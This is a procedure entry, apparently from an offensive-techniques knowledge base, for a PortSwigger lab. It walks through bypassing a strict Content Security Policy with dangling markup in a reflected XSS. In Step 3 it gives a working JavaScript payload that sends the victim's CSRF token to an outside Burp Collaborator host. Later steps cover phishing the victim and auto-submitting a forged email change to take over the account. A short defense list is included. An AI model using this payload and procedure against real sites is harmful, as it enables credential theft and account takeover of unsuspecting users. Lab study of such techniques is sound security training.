---
id: 47cbae7b-a063-4fbc-a9a1-b22ccf39c161
name: >-
  Bypass-Strict-CSP-in-Reflected-XSS-via-Dangling-Markup-for-CSRF-Token-Exfiltration
type: procedure
verified: true
submitted: true
created_at: '2020-08-25T10:08:59.220450+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
platforms:
  - Web
tags:
  - '[[tags/CSRF]]'
  - '[[tags/Reflected XSS]]'
  - '[[tags/Web Applications]]'
tactics:
  - '[[Execution]]'
  - '[[Credential Access]]'
  - '[[Collection]]'
techniques:
  - '[[JavaScript]]'
  - '[[SAML Tokens]]'
sub_techniques: []
commands: []
tools:
  - '[[tools/Burp-Suite]]'
validated: true
---

# Bypass-Strict-CSP-in-Reflected-XSS-via-Dangling-Markup-for-CSRF-Token-Exfiltration

## Summary

This procedure demonstrates how to bypass a very strict Content Security Policy (CSP) protecting a reflected XSS vulnerability using a dangling markup technique. The attack exfiltrates the victim's CSRF token via a JavaScript payload hosted on an exploit server, then uses the stolen token to craft a CSRF proof-of-concept (PoC) that changes the victim's email address when auto-submitted in their browser.

## Description

In scenarios where a web application has a reflected XSS vulnerability but enforces a strict CSP that blocks external scripts and resources, direct payload execution is prevented. This procedure leverages dangling markup injection to create a reflected link that, when clicked by the victim, reloads the exploit server payload in the context of the vulnerable page. The vulnerable page sets window.name to the CSRF token before reflection, allowing the payload to exfiltrate it to an attacker-controlled Burp Collaborator server via an image request (which may be allowed under CSP). Once exfiltrated, the token is used to generate a customized CSRF PoC HTML form that auto-submits a malicious email change request using the victim's session.

This technique is effective against applications like email change functionalities protected by both XSS filters/CSP and CSRF tokens, such as in PortSwigger Web Security Academy labs. It requires the victim to be logged in and interact (click the link), making it a semi-automated attack.

## Requirements

- Valid login credentials for the target web application (attacker and victim accounts).
- Burp Suite Professional with Collaborator enabled for exfiltration.
- Access to an exploit server (e.g., PortSwigger's exploit server) to host the JavaScript payload and CSRF PoC.
- Network access to intercept and modify HTTP requests (e.g., via Burp proxy).
- The target must have a reflected XSS in a parameter like 'email' and set window.name to the CSRF token on the page.

## Defense

- Implement strict CSP with 'unsafe-inline' disallowed and no external resource allowances for images/scripts.
- Use HttpOnly and Secure flags on CSRF tokens to prevent JavaScript access.
- Sanitize reflected parameters to prevent markup injection (e.g., no allowing <base> or <a> tags).
- Monitor for anomalous image requests to collaborator-like domains.
- Enable CSP reporting to log violations.
- Use double-submit cookies or synchronized tokens for CSRF protection that aren't stored in window.name.

## Objectives

1. Inject a dangling markup payload via reflected XSS to trick the victim into clicking a link that exfiltrates their CSRF token.
2. Capture the exfiltrated CSRF token using Burp Collaborator.
3. Craft and deliver a CSRF PoC using the stolen token to modify the victim's account (e.g., change email).
4. Achieve account takeover or disruption without direct script execution.

## Instructions

### Step 1: Login to the Target Application

**Context**: Authenticate as the attacker to understand the application flow and set up interception. Ensure the victim is also logged in separately for the exploit to work with their session.

Navigate to the login page of the target application (e.g., https://your-lab-id.web-security-academy.net/login) and enter valid credentials. Configure your browser to proxy traffic through Burp Suite to intercept subsequent requests.

### Step 2: Generate Burp Collaborator URL

**Context**: Obtain a unique out-of-band interaction URL to receive the exfiltrated CSRF token without violating CSP.

In Burp Suite, navigate to the Collaborator tab and click "Copy to clipboard" to get a unique URL (e.g., abc123.burpcollaborator.net).

### Step 3: Prepare the Exploit Server Payload

**Context**: Host the JavaScript code on the exploit server to handle the initial load and exfiltration.

Use the following code ([[codes/Dangling-Markup-CSRF-Token-Exfiltration-Script]]), replacing placeholders with your actual values:

```javascript
<script>
if(window.name) {
    new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
    } else {
        location = 'https://your-lab-id.web-security-academy.net/email?email=%22%3E%3Ca%20href=%22https://your-exploit-server-id.web-security-academy.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
</script>
```

Upload this to your exploit server (e.g., https://your-exploit-server-id.web-security-academy.net/exploit) and generate the exploit URL. Send this URL to the logged-in victim via phishing or other means.

### Step 4: Exfiltrate the CSRF Token

**Context**: When the victim visits the exploit URL, it redirects to the vulnerable page, injects the dangling markup, and prompts a click that reloads the payload with window.name set to the token.

Monitor the Burp Collaborator tab. Once the victim interacts, click "Poll now" to check for interactions. In the request details, extract the CSRF token from the query parameter sent to the Collaborator URL (e.g., ?token=abc123).

### Step 5: Intercept and Modify the Email Change Request

**Context**: Capture the format of the email change request, including the CSRF token field, to generate the PoC.

As the attacker, navigate to the change email functionality (e.g., /my-account/change-email) and submit a test request. Intercept it in Burp Repeater or Proxy. Modify the email parameter to a test value and note the structure, including the csrf_token field.

### Step 6: Generate CSRF PoC and Customize with Victim's Token

**Context**: Use Burp's CSRF PoC generator to create an auto-submitting HTML form, then replace the token with the victim's exfiltrated one.

In Burp, right-click the intercepted change email request, select "Engagement tools" > "Generate CSRF PoC". Check "Include Auto-Submit script". Regenerate the PoC with the modified email set to 'hacker@evil-user.net'. Copy the generated HTML form.

Edit the HTML: Replace the csrf_token value with the victim's token obtained from Collaborator. Ensure the form posts to the correct endpoint with the malicious email.

### Step 7: Deliver the CSRF Exploit

**Context**: Host the customized CSRF HTML on the exploit server and deliver to the victim to auto-submit the malicious request.

Replace the JavaScript in the exploit server payload (from Step 3) with the modified CSRF HTML form. Generate a new exploit URL and deliver it to the victim. When loaded, the form will auto-submit using the victim's session cookie and the provided (stolen) token, changing their email to the attacker's controlled address.

Verify success by logging in as the victim and checking the updated email, or monitoring application logs.
